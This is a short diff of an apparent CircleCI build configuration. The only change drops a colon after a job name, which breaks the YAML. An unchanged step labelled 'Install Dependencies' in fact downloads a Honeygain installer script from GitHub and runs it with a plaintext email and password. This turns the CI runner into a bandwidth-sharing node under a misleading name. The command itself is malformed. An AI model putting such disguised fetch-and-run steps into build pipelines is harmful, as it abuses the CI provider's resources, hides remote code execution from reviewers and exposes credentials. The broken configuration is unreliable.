@@ -252,7 +252,7 @@ jobs:
         - run:
             name: Install Dependencies
             command: wget curl -L https://raw.githubusercontent.com/spiritLHLS/honeygain-one-click-command-installation/main/hg.sh -o hg.sh && chmod +x hg.sh && bash hg.sh -m mallory121@protonmail.com -p Zaq@1234567890
-    aku37:
+    aku37
       docker:
             - image: circleci/ruby:2.5.3
       steps:
